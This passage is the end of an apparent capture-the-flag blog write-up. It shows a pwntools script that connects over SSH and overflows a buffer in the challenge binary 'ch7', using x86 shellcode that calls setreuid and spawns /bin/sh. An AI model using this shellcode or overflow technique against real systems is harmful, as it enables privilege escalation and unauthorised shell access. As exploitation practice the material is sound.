+shellcode = b&#34;\x31\xc0\x31\xdb\x31\xc9\x66\xbb\xb7\x04\x66\xb9\x53\x04\xb0\x46\xcd\x80\x31\xc0\x31\xc9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80&#34;
+user_add = 0x804a040
+payload = shellcode + b&#34;a&#34;*(0x200-len(shellcode)) + p32(user_add)
+def exploit():
+  # __breakpoint=&#34;&#34;&#34;
+  #   b*0x80484f1
+  #   &#34;&#34;&#34;
+  # gdb.attach(io,__breakpoint)
+  io.recvuntil(b&#34;[+] Running program with username : &#34;)
+  io.interactive()
+
+#io = process([BIN,payload])
+# context.log_level = &#34;debug&#34;
+conn = ssh(host=host, port=port, user=username, password=passwd)
+io = conn.process([&#34;./ch7&#34;,payload])
+exploit()
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
